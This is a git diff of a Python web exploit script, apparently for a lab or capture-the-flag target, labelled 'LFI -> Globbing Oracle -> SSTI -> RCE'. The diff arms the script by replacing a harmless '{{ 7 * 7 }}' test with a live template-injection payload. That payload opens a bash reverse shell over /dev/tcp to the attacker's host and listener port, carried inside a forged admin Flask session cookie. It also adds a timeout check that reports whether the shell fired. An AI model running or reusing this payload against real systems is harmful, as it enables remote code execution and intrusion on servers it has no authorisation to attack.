@@ -9,8 +9,6 @@ import signal
 REMOTE = None
 LOCAL = None
 
-proxies = {"http": "http://127.0.0.1:8080"}
-
 session = requests.Session()
 
 class C:
@@ -110,9 +108,8 @@ def handler(signum, frame):
     raise TimeoutError("SSTI payload fired!")
 
 def trigger_ssti(cookie):
-    print(cookie)
-    r = requests.get(f"{REMOTE}/lain", cookies={"session": cookie}, proxies=proxies)
-    return r.text[r.text.index("welcome") - 20 : r.text.index("welcome") + 20]
+    r = requests.get(f"{REMOTE}/lain", cookies={"session": cookie})
+    return r.text
 
 if __name__ == "__main__":
 
@@ -120,30 +117,18 @@ if __name__ == "__main__":
         REMOTE = sys.argv[1]
         LOCAL = sys.argv[2]
         PORT = sys.argv[3]
+        SIGNING_KEY = sys.argv[4]
 
     except:
-        print("Usage: python web_exploit.py [REMOTE] [LOCAL] [LOCALPORT]")
+        print("Usage: python web_exploit.py [REMOTE] [LOCAL] [LOCALPORT] [SIGNING_KEY]")
         sys.exit(1)
 
     banner("[ETHICAL HACKING] Web server exploit: LFI -> Globbing Oracle -> SSTI -> RCE")
 
-
-
-    info(f"target: {C.BOLD}{REMOTE}{C.RESET}")
-    print()
-
-    #secret_key = brute_force_filename()
-    #print()
-    secret_key = "../key/secret_f5d5249f-25fd-4031-8c90-689fc5378454"
-
-    info("reading signing key via LFI...")
-    signing_key = LFI(secret_key).lstrip(" \n")
-    kv("signing_key", signing_key, C.GREEN)
-    print()
+    signing_key = SIGNING_KEY
 
     info("forging admin session cookie with SSTI payload embedded...")
-    #SSTI_PAYLOAD = f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('/bin/bash -c \"bash -i >& /dev/tcp/{LOCAL}/{PORT} 0>&1\"').read() }}}}"
-    SSTI_PAYLOAD = "{{ 7 * 7 }} "
+    SSTI_PAYLOAD = f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('/bin/bash -c \"bash -i >& /dev/tcp/{LOCAL}/{PORT} 0>&1\"').read() }}}}"
     data = {"is_admin": True, "uuid": SSTI_PAYLOAD}
     cookie_value = sign_flask_session(signing_key, data)
     kv("cookie_value", cookie_value, C.MAGENTA)
@@ -152,6 +137,14 @@ if __name__ == "__main__":
     warn(f"run {C.BOLD}nc -lnvp {PORT}{C.RESET}{C.YELLOW} in a different terminal now{C.RESET}")
 
     info("firing request to /lain ...")
+    signal.signal(signal.SIGALRM, handler)
+    signal.alarm(1)
 
-    result = trigger_ssti(cookie_value)
-    print(result)
+    try:
+        result = trigger_ssti(cookie_value)
+        warn(f"reverse shell {C.BOLD}failed{C.RESET} to trigger!")
+    except TimeoutError as e:
+        info("reverse shell should now be triggered!")
+    finally:
+        signal.alarm(0)
+        sys.exit(0)
